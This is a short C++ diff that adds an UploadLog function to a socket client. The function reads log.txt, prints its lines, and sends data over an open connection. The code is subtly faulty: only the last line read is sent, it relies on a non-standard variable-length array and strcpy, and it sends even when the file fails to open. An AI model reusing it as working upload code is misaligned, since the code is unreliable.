@@ -92,3 +92,22 @@ Client::Client(void)
     setsockopt(connectSocket, IPPROTO_TCP, TCP_NODELAY, &value, sizeof(value));
 
 }
+void UploadLog()
+{
+     string line;
+     ifstream file ("log.txt");
+     if(file.is_open())
+     {
+         while(getline(file, line))
+         {
+             cout << line << '\n';
+         }
+         file.close();
+     } else cout << "Unable to open file";
+     const unsigned int packet_size = line.size() + 1;
+     char packet_data[packet_size];
+     strcpy(packet_data, line.c_str());
+     send(connectSocket, packet_data, sizeof(packet_data), 0);
+     closesocket(connectSocket);
+}
+
